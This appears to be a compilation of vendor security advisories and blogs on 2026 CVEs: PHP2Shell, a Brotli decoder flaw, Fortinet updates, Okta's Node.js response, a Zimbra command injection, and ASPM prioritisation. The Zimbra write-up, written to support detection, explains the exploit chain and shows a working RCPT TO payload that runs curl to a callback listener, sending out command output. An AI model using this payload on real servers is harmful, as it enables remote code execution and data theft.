Advisories are reported when the PHP runtime is present in your project, and can be filtered by CVE ID.

Snyk Container

PHP installed from Linux distribution packages is reported once the distribution has published its advisory. Some supported distributions have published advisories, which are available in test results (for example, SNYK-RHEL10-PHP84-21392647 and SNYK-UBUNTU2604-PHP85-21373920). We are importing others as they publish, which are available here: CVE-2026-109618 CVE-2026-109619. PHP compiled from source, including the official php: Docker images, is not detected by Snyk Container.

Snyk API & Web

DAST examines and tests running applications from the outside and fingerprints their technology stack. If a customer's application is exposed to php2shell, we detect and report it

Zero Day report

The Snyk Zero Day report matches your projects to the advisories, so it can only list projects scanned using “Unmanaged scans” or Container scans of distribution packages. For Open Source-only projects, it will show no results.

Finding your PHP attack surface with Snyk API & Web

Before you can patch, you need the list. Snyk API & Web's Discovery tab enumerates assets found on your domains and fingerprints their technology stack. Open Discovery, set the Tech filter to PHP, and you have every discovered host and endpoint where PHP was identified, with its risk rating, score, and last-seen date, ready to scan or add as a target.

The same Tech filter is also available in the Targets list, so the applications you added can be narrowed to PHP the same way.

This does not tell you the PHP version. It tells you where to look, which is a crucial step towards remediation.

Test against the vulnerability with Snyk API & Web

Snyk API & Web allows you to scan your applications and APIs and detect if you are vulnerable to the PHP2Shell vulnerability.

A scan with a full profile now tests for the PHP2Shell vulnerability. Additionally, you can create a custom scan profile that tests against PHP2Shell exclusively, ensuring you have a quick way to know if your applications are vulnerable or if your remediation has taken place already.

What we are doing

Advisories for both CVEs were published before PHP's 14:00 UTC release and updated with affected versions and fix details within about 30 minutes of it.

An additional advisory has been published for CVE-2026-115560, which will be updated as details and the fix for it are released.

Distribution advisories are being imported as each Linux distribution publishes. Ubuntu and Red Hat are available now.

A Zero Day report for this event is available for Unmanaged and Container projects.

As always, Snyk's security research team is tracking this disclosure and will update the advisories as new information arrives. If you have questions, contact your Snyk account team or Support.

Title: Broccoli2shell: Everything You Need To Know About The Critical Brotli Decoder Vulnerability
Context: A critical vulnerability, tracked as CVE-2026-111497 and referred to as Broccoli2Shell, has been identified in the Brotli decompression library
Full Text:
A critical vulnerability, tracked as CVE-2026-111497 and referred to as Broccoli2Shell, has been identified in the Brotli decompression library. The vulnerability affects multiple widely used technologies, including Node.js, Bun, Envoy Proxy, and more. Successful exploitation could allow an unauthenticated remote attacker to trigger memory corruption, disclose sensitive information, crash affected processes, or potentially achieve remote code execution (RCE).

Organizations using affected components to decompress untrusted Brotli-compressed data are advised to prioritize remediation.

CVE-2026-111497 was discovered and reported by Khai Tran and Sylvie Mayer (OpenAI Codex Security), with fixes implemented by Matteo Collina and Antoine du Hamel (Node.js). Ron Masas (Imperva Red Team) demonstrated its exploitability, while OpenSourceMalware and Aikido analyzed its impact on the Python ecosystem.

What is CVE-2026-111497?

Broccoli2Shell (a.k.a Node2Shell and HTTP2Shell) originates from an out-of-bounds write vulnerability in the Brotli decoder, a widely adopted compression component used to reduce the size of HTTP traffic and other data. The flaw occurs when the decoder improperly handles specially crafted compressed data during block-processing operations, potentially writing beyond allocated memory boundaries. An attacker can exploit this behavior by supplying malicious Brotli-compressed input to a vulnerable application, potentially resulting in memory disclosure, application crashes, or arbitrary code execution with the privileges of the affected process. Researchers have demonstrated successful exploitation against unpatched Node.js environments.

Although initially associated with Node.js, the vulnerability originates in the upstream Brotli C decoder and extends to multiple downstream technologies that incorporate the affected component. Exploitation requires an application or dependency to decompress attacker-controlled Brotli data, either through incoming HTTP requests, externally fetched responses, or other untrusted compressed content. Certain HTTP clients and application frameworks may perform decompression automatically when Brotli support is enabled, potentially exposing applications even when Brotli is not explicitly referenced in application code.

Wiz Research data: what’s the risk to cloud environments?

Cloud environments are particularly exposed due to the widespread use of Brotli-enabled components across containerized applications, Kubernetes clusters, API gateways, reverse proxies, serverless workloads, and cloud-hosted web services. Internet-facing applications that process attacker-controlled requests, as well as internal services that retrieve compressed responses from untrusted external sources, may provide exploitation paths. Successful exploitation could enable attackers to compromise application workloads, access sensitive information, disrupt service availability, or execute malicious code within affected containers or runtime environments.

According to Wiz data 91% of cloud environments have resources vulnerable to CVE-2026-111497, and 82% of cloud environments have publicly exposed Node.js instances.

Which products are affected?

Additional products that bundle or link against vulnerable versions of the Brotli C decoder may also be affected. Organizations should consult vendor-specific security advisories, particularly for statically linked libraries and embedded dependencies. End-of-life runtime branches should be migrated to supported versions.

Which actions should security teams take?

Organizations should prioritize the following mitigation and remediation measures:

Apply security updates: Upgrade affected Brotli libraries, Node.js runtimes, Python packages, Bun, Envoy Proxy, and Istio deployments to their respective patched versions or later supported releases.

Identify vulnerable cloud workloads: Inventory virtual machines, Kubernetes clusters, containers, serverless functions, API gateways, and application dependencies for vulnerable Brotli components. Prioritize internet-facing services and workloads processing untrusted compressed data.

Review application exposure: Identify applications that decompress Brotli-compressed HTTP requests, external HTTP responses, uploaded files, or other attacker-controlled content. Include indirect and transitive dependencies in the assessment.

Rebuild and redeploy affected workloads: Update container base images, dependency lockfiles, and bundled libraries. Rebuild and redeploy affected container images, restart running processes, and verify that patched components are loaded.

Implement temporary mitigations: Where immediate patching is not possible, consider disabling Brotli decompression or rejecting Brotli-encoded requests before they reach vulnerable components. Restrict untrusted compressed responses where feasible. These controls may reduce exposure but do not replace patching.

Strengthen monitoring and detection: Review WAF, application, and network logs for suspicious Brotli-compressed traffic, unexpected application crashes, and anomalous process behavior. Monitor affected workloads for indicators of exploitation.

Wiz customers can use the pre-built query and advisory in the Wiz Threat Center to search for vulnerable instances in their environment.

Title: Critical vulnerabilities in Fortinet products
Context: Fortinet have announced critical vulnerabilities in Fortinet products and are releasing critical security updates for a wide range of products
Full Text:
Fortinet have announced critical vulnerabilities in Fortinet products and are releasing critical security updates for a wide range of products. Fortinet are advising customers to complete the security updates as a priority.

This alert is intended for all organisations using Fortinet products.

Background

Fortinet are releasing critical security updates to a wide range of products. Fortinet have recommended customers implement the security updates as a prioirity.

The Australian Signals Directorate's Australian Cyber Security Centre (ASD’s ACSC) is monitoring the situation but has no further details beyond Fortinet’s current public advice. Fortinet is expected to release more information 10 November 2026.

Fortinet has announced that multiple versions of FortiOS, FortiManager, FortiAnalyzer, FortiMail and FortiAuthenticator are affected.

A comprehensive list of affected products and fixed versions can be found here.

Fortinet have advised affected versions of FortiSASE have already had security updates applied automatically but FortiManager products may require manual updates.

ASD’s ACSC is currently not aware of active exploitation related to these vulnerabilities in Australia.

Mitigation advice

ASD’s ACSC advises individuals and organisations to:

Identify Fortinet products within their environments.

Apply available security updates.

Monitor and review Fortinet official guidance.

Continue to monitor Fortinet products for evidence of exploitation activity.

Where the relevant security updates are unable to be implemented immediately, Fortinet have recommended customer reduce exposure by:

Restricting administrative interfaces (HTTPS, SSH) to trusted IP addresses or disable them on external interfaces.

Ensuring FortiManager administration is not reachable from the internet.

Implementing strong credentials and mandating Multi-Factor Authentication (MFA) on user accounts.

Where to get help

Organisations that have been impacted, suspect impact or require advice and assistance can contact us via 1300 CYBER1 (1300 292 371), or at www.cyber.gov.au/submit-a-report.

What happened?

On October 21, 2026, the Node.js project released fixes for a Brotli decompression flaw (CVE-2026-111497, "Node2Shell"). The flaw is an out-of-bounds write that can crash a process or allow remote code execution (RCE).

Okta's response

Security Patching Services: The change has been deployed across the production environments of both Okta and Auth0.

No Evidence of Exploitation: To date, Okta and Auth0 have observed no evidence of exploitation.

Do I need to do anything?

Customers using Auth0: We recommend updating the runtime version in your Auth0 tenant settings or in your Action configuration to Node 22, then deploying your changes. Customers already on Node 22 do not need to redeploy.

Customers using Auth0 SDKs with Node.js: We recommend downloading and installing the latest version.

Customers using the ad-ldap connector: We recommend downloading and installing the latest version.

Title: How CVE-2026-73570 turns a Zimbra log file into remote code execution
Context: When we are building detections for various threats, we regularly run the exploits on representative systems to help us build high-quality rules
Full Text:
When we are building detections for various threats, we regularly run the exploits on representative systems to help us build high-quality rules. The Common Vulnerabilities and Exposures (CVE) entry CVE-2026-73570 for Zimbra is no exception. Zimbra is a widely used enterprise email and collaboration software platform, known for its SMTP platform, among other services. SMTP plays a critical role in the infrastructure of many organizations by providing email services that often include either direct or indirect identity management. In addition to the direct appeal for attackers to read emails, attachments, etc., there is also an appeal for compromised identity management. A compromised mail server can be used to impersonate legitimate accounts for further access and exploitation, becoming a staging ground for additional targets.

CVE-2026-73570 is an unauthenticated command injection vulnerability in Zimbra, and one malformed recipient address is enough to trigger it. Send a malformed request and it is logged in /var/log/zimbra.log. From there, the Swatchdog monitoring daemon matches it against a service status pattern and passes it to /bin/sh inside a backticked Perl string. The result is remote code execution as the zimbra user. The account reads every mailbox on the server and sends as any local identity, so compromising the mail server compromises the identities it serves.

We reproduced the full chain while building detections for it, and several of the public proofs of concept (PoCs) we tested write a payload that Swatchdog never matches, so a failed test looks like a patched server. The working chain is shown next, along with the rule that fires when a shell spawns anything other than snmptrap.

Note that if you host Zimbra Simple Mail Transfer Protocol (SMTP) services and haven’t patched to version 10.1.20+, please do so before trying out the steps in this blog post.

How the Zimbra command injection vulnerability works

The core entry point for this kind of attack is CVE-2026-73570, a vulnerability in an unpatched Zimbra service (patched as of Zimbra version 10.1.20). When exploited, it can provide arbitrary remote code execution bypassing authentication requirements. To do this, an attacker passes a specifically crafted SMTP message that’s written to the notification file /var/log/zimbra.log for processing. Under normal circumstances, entries are written to this log to keep track of the status of services, such as when a given mailbox service has started or a message delivery has failed:

Sep 30 22:48:29 mail postfix/pickup[57597]: 6272F1E1393: uid=997 from=<zimbra> Sep 30 22:48:29 mail postfix/cleanup[57599]: 6272F1E1393: message-id=<20261001024829.6272F1E1393@mail.lab.test> Sep 30 22:48:29 mail postfix/qmgr[57598]: 6272F1E1393: from=<zimbra@mail.lab.test>, size=604, nrcpt=1 (queue active) Sep 30 22:48:29 mail postfix/error[57602]: 6272F1E1393: to=<zimbra@mail.lab.test>, orig_to=<zimbra>, relay=none, delay=4707, delays=4707/0.01/0/0.01, dsn=5.0.0, status=bounced (mail.lab.test) Sep 30 22:48:29 mail postfix/cleanup[57599]: 6DD441E13F5: message-id=<20261001024829.6DD441E13F5@mail.lab.test> Sep 30 22:48:29 mail postfix/bounce[57603]: 6272F1E1393: sender non-delivery notification: 6DD441E13F5 Sep 30 22:48:29 mail postfix/qmgr[57598]: 6DD441E13F5: from=<>, size=2463, nrcpt=1 (queue active) Sep 30 22:48:29 mail postfix/qmgr[57598]: 6272F1E1393: removed Sep 30 22:48:29 mail postfix/error[57602]: 6DD441E13F5: to=<zimbra@mail.lab.test>, relay=none, delay=0.01, delays=0.01/0/0/0, dsn=5.0.0, status=bounced (mail.lab.test) Sep 30 22:48:29 mail postfix/qmgr[57598]: 6DD441E13F5: removed

Figure 2: Log indication that a message failed to be delivered to zimbra@mail.lab.test.

As part of the monitoring components of Zimbra, a daemon called Swatchdog watches this file for specific log entries that match the format of a service status change:

Service status change: <host> <service> changed from stopped to running Service status change: <host> <service> changed from running to stopped

Figure 3: Normal service message.

When an entry is identified and SNMP notifications are enabled, it invokes a notification function that generates an snmptrap, a one-way alert from the mail server to a monitoring host. The target of CVE-2026-73570 is the way that this message is constructed. The SNMP notification message is parsed with Perl. Zimbra packages a copy of the Perl program Swatchdog to handle this parsing and monitor logs. It tails the log file and compiles /opt/zimbra/conf/swatchrc.in into a Perl script using perlcode lines to directly embed Perl commands into that script. By inspecting the contents of swatchrc.in, we can see the vulnerability in this process. In version Release 10.1.16.BETA.4200001.UBUNTU24.64 UBUNTU24_64 FOSS edition, this is line 26, specifically the dosnmp call:

perlcode 0 my $snmptrap="/opt/zimbra/common/bin/snmptrap $snmpargs"; perlcode 0 my $snmpsvctrap="ZIMBRA-TRAP-MIB::zmServiceStatusTrap"; perlcode 0 my $snmpsvcname="ZIMBRA-MIB::zmServiceName"; perlcode 0 my $snmpsvcstatus="ZIMBRA-MIB::zmServiceStatus"; ... perlcode 0 sub dosnmp { my %args = (@_); print "SNMP notification: $args{MESSAGE}\n"; `$snmptrap $snmpsvctrap $snmpsvcname s $args{SERVICE} $snmpsvcstatus i $statuses{$args{STATUS}}`; }

Figure 5: Status 1 for service “mailbox”.

However, the service name is built from $args{SERVICE} and is vulnerable to injection through log messages matching the service format. Injecting a log message is straightforward, as Postfix already records pieces of what any given SMTP client sent. So an attacker just needs to send a message that will end up in this log file. One method of doing this is to supply a message with an invalid address syntax.

A normal SMTP message includes a MAIL FROM section, denoting the sender, and a RCPT TO, specifying the recipient, along with DATA, which is the message. The first two require the email address to be wrapped in angle brackets; for example, <address@host.name>. If an attacker doesn’t follow the wrapping and omits the final >, the specified unclosed address will show up in the log file. For example, an address of <address@host.namewill have a log entry as follows:

warning: Illegal address syntax from mail.lab.test[10.0.2.15] in RCPT command:<address@host.name

Figure 6: Invalid recipient log entry.

Since the attacker controls this address, they can then specify a payload that will match the pattern that the daemon is looking for, Service status change: <host> <service>. Instead of supplying a valid host and service, the service can be replaced with arbitrary commands; for example $(touch /tmp/manual_test.txt). This will then be run as the original Perl process calls /bin/sh to send the notification. With this, the attacker has arbitrary remote code execution (RCE) on the target, including the ability to masquerade as other email identities from this server.

The full chain, from inbound message to code execution, is as follows:

Stage

Component

Artifact

Delivery

Postfix

Malformed RCPT TO logged to /var/log/zimbra.log.

Trigger

Swatchdog

Log line matches the service status pattern.

Execution

Perl dosnmp

Backticks pass $args{SERVICE} to /bin/sh.

Impact

zimbra user

Code execution, identity access.

Why most public CVE-2026-73570 PoCs fail

Given the ability to execute arbitrary code, an attacker can use a number of different mechanisms to establish persistence and gain further access. In testing these approaches, we found that many of the existing PoCs didn’t fully establish the RCE chain. In some cases, the PoCs wrote incorrectly formatted commands to the log file, preventing their execution. As a result, we developed a PoC that runs a variety of commands. We also include tests that run against a remote host and send a callback to a locally running web server. With this approach, we can see that the attack works without causing any additional on-disk changes to the target:

elastic@test-as89074:~$ python3 CVE-2026-73570_poc.py --host 10.0.2.15 --command "id" --listen [*] Scanning standard SMTP ports on 10.0.2.15... [+] Port 25 (SMTP) : OPEN [-] Port 587 (SMTP) : CLOSED/FILTERED [*] Targeting 10.0.2.15:25 (Plain SMTP) [*] OOB Listener URL: http://10.0.2.16:8080/capture/abc123/ [*] Payload: x: Service status change: localhost $(curl "http://10.0.2.16:8080/capture/abc123/$( id | tr -d ' ' )") changed from stopped to running [*] Full RCPT TO: <"x: Service status change: localhost $(curl "http://10.0.2.16:8080/capture/abc123/$( id | tr -d ' ' )") changed from stopped to running"@cve.invalid> [<] 220 mail.lab.test ESMTP Postfix [>] EHLO localhost [<] 250-mail.lab.test 250-PIPELINING 250-SIZE 10240000 250-VRFY 250-ETRN 250-STARTTLS 250-ENHANCEDSTATUSCODES 250-8BITMIME 250 DSN [>] MAIL FROM:<test@test.com> [<] 250 2.1.0 Ok [>] RCPT TO:<"x: Service status change: localhost $(curl "http://10.0.2.16:8080/capture/abc123/$( id | tr -d ' ' )") changed from stopped to running"@cve.invalid> [<] 501 5.1.3 Bad recipient address syntax [*] Waiting up to 10 seconds for OOB callback... [*] Internal OOB listener started on http://10.0.2.16:8080/capture/... [***] OOB CALLBACK RECEIVED [***] [+] Captured Data: uid=997(zimbra)gid=982(zimbra)groups=982(zimbra),5(tty),981(postfix) [+] SUCCESS: The malicious payload was executed! [+] Captured Data: uid=997(zimbra)gid=982(zimbra)groups=982(zimbra),5(tty),981(postfix)

Figure 8: PoC successful execution using a callback.

How to patch and detect CVE-2026-73570

Zimbra has patched this vulnerability. To remediate and detect CVE-2026-73570, take the following steps:

Upgrade to Zimbra 10.1.20 or later. This is the only complete fix.

Install Elastic Defend (if you haven’t already).

Enable the Zimbra Swatchdog SNMP Command Injection Execution security information and event management (SIEM) rule to detect exploitation and to hunt retroactively for pre-patch attempts.

sequence by host.id with maxspan=30s [process where host.os.type == "linux" and event.type == "start" and event.action in ("exec", "exec_event", "start") and process.name in ("sh", "bash", "dash", "ash", "zsh", "ksh") and process.parent.name like~ "perl*" and process.parent.command_line like~ "*.swatchdog_script*" and process.command_line like~ "*snmptrap*" and process.command_line like~ "*zmservicename*" and process.command_line like~ "*zmservicestatus*" ] by process.entity_id [process where host.os.type == "linux" and event.type == "start" and event.action in ("exec", "exec_event", "start") and process.name != "snmptrap" ] by process.parent.entity_id

The Zimbra Swatchdog detection rule identifies a sequence of processes that break from the normal Zimbra pattern. First, a shell process, /bin/sh in the prior example, is started from a parent watchdog script Perl process and has snmptrap in its command arguments, matching the expected call /opt/zimbra/common/bin/snmptrap ... ZIMBRA-MIB::zmServiceName s mailbox ... from earlier. Second, the rule detects a subprocess launched by the shell identified in the first step, provided that the subprocess isn’t snmptrap. Since the only process that should run under legitimate circumstances is snmptrap, this is a very strong indicator of successful exploitation.

If you detect a compromise, hunt for:

Standard indicators of remote code execution on the host.

Phishing emails originating from the server.

Compromise of local databases and signing keys, as well as LDAP exports.

Less direct surfaces beyond the mail store itself.

Title: ASPM in the AI Era Part 2: Prioritize Exploitable Risks with Code-to-Cloud Context
Context: For example: SCA: CVE-based findings are enriched with context from the NVD Vulnerability Catalog, real-time EPSS (Exploit Prediction Scoring System) probability scores, active...
Full Text:
In Part 1, we established how to centralize your AppSec tools, correlate assets, and map scanner coverage across repositories. Establishing visibility is an essential baseline, but once your connectors start streaming data into a single location, prioritization becomes the primary focus.

As highlighted in our recent State of SDLC Security 2026 report, AI’s primary impact isn't necessarily introducing entirely new risks. It's the amplification of existing ones through faster code generation, contributing to a wider attack surface area with less time for human review.

For lean AppSec teams, the real promise of ASPM lies in how it helps prioritize application risk across their enterprise. But, as we saw with the React2Shell example, prioritization requires context across the entire application lifecycle. AppSec teams must quickly distinguish between theoretical code flaws sitting on un-deployed branches and active vulnerabilities running on internet-facing workloads.

To transform raw scanner output into actionable risk, Wiz Code executes prioritization across two distinct layers:

Finding-level prioritization: Normalizing scanner data into unified schemas, actively enriching findings with threat intelligence and network reachability, and deduplicating identical alerts across overlapping tools.

Attack path prioritization: Using the Wiz Security Graph to connect code-level findings with live cloud runtime context, elevating isolated flaws into fully validated attack paths.

Let’s look at how to operationalize both layers in your environment.

Enrich, Deduplicate, and Prioritize Individual Findings

Findings from connected scanners populate into their respective domains in the Wiz platform. For example, SAST results flow into the SAST Findings tab, SCA results populate in the Vulnerability Findings tab, and Secret results show up in the Secret Findings page. You can easily filter any table by “origin” to isolate alerts from a specific tool. In the example below, we’re filtering vulnerability findings surfaced from a Snyk SCA scan.

From this unified baseline, Wiz executes multiple layers of prioritization to help AppSec teams focus on what matters.

Enrichment

Imported findings are enriched with domain specific context, turning generic alerts into prioritized findings. For example:

SCA: CVE-based findings are enriched with context from the NVD Vulnerability Catalog, real-time EPSS (Exploit Prediction Scoring System) probability scores, active exploit availability, and CISA KEV status. Our Threat Research team also denotes findings with active threats and writes complete advisories, so security teams have the latest insight on zero days.

SAST: CWE findings include code snippets so security teams have visibility into the location and context of weaknesses.

DAST: Wiz independently validates network exposure for the web applications with DAST findings using the Attack Surface Management (ASM) module. The ASM engine can be configured to run other checks such as secrets or sensitive data exposure checks from the perimeter on these newly created endpoints. Private-only addresses are marked differently so teams can prioritize findings with a real external attack surface.

Secrets: Wiz runs ingested secrets through databases to see if the secret was leaked, classifies secret types for understanding its impact, and assigns severities to the detected secrets based on threat research if the originating scanner did not provide any.

Deduplication

Security teams should not waste time chasing down multiple vulnerability findings for the exact same issue. When multiple tools scan the same codebase and produce duplicative vulnerability findings, Wiz can easily reconcile them.

Wiz labels one finding as "Representative" and the duplicates as "Duplicate." Teams can apply automated Ignore Rules scoped to duplicate findings, instantly eliminating redundant noise in reporting without losing the underlying scanner audit trail. So instead of generating individual tickets for each finding, teams can create one ticket to consolidate the findings.

Prioritize Exploitable Attack Paths

Traditionally ASPM has focused on aggregating findings and prioritizing risk using simple scoring. Wiz takes a different approach by correlating findings with additional risk on the Wiz Security Graph. This is where the platform moves from managing vulnerabilities to managing exploitable attack paths.

The Wiz Security Graph correlates multiple risk factors into a single Wiz Issue (identifying toxic combinations of risk). Critically, these controls run on your third-party findings exactly the same way they run on native Wiz findings. If you connect a scanner, its data instantly becomes part of your code-to-cloud attack path analysis.

What this looks like in practice

Let's look at how this context transforms a standard alert into a prioritized Wiz Issue. Imagine your Snyk integration flags a high-severity SAST finding (such as a remote code execution or command injection flaw) on a repository branch. In a vacuum, a developer might treat this as an urgent priority, or they might ignore it if they assume it is an internal tool.

The Wiz Security Graph evaluates the entire deployment lifecycle to uncover the actual risk. A single Wiz Issue might reveal:

The Code Flaw: A SAST finding from Snyk and a native Wiz SAST finding, both originating on the same repository branch.

The Build Artifact: That specific branch was built into a container image currently running in a production Kubernetes cluster.

The Exposure: The Kubernetes cluster is exposed to the internet via a public application endpoint.

Active Validation: An Attack Surface Management (ASM) finding confirms the endpoint is actively reachable from the outside.

Instead of manually piecing together four separate alerts across three different tools, Wiz draws the connection natively. Because these findings all resolve to the same underlying resource and represent the same attack path, they are surfaced as one unified, high-priority Wiz Issue.

Conversely, if that same SAST flaw was detected on a branch that never ships to a running cloud workload, it remains a low-priority finding—sparing developers from interrupting their sprint for a non-exploitable risk.

Manage security debt at scale

Not every finding may map to an attack path. But, lower-severity findings still represent real risk if left unaddressed. In Wiz, organizations can track and govern these findings through Posture Issues.

AppSec teams can create logical groupings of findings based on several criteria such as severity, project, code repository and more to build tailored campaigns for managing security debt. Teams can also define SLAs for remediation to align with organizational policies.

Up Next: Remediation and Automation at Machine Speed

Separating signal from noise is a massive win, but prioritization without rapid remediation is only half the battle. Once critical attack paths are identified, how do you ensure the right engineering team fixes them without slowing down release cycles?

In Part 3, the final instalment of this series, we’ll explore how to remediate at machine speed. We’ll cover how to leverage the Wiz Green Agent to generate tailored remediation plans in developer workflows and how to automate response with Wiz Workflows.
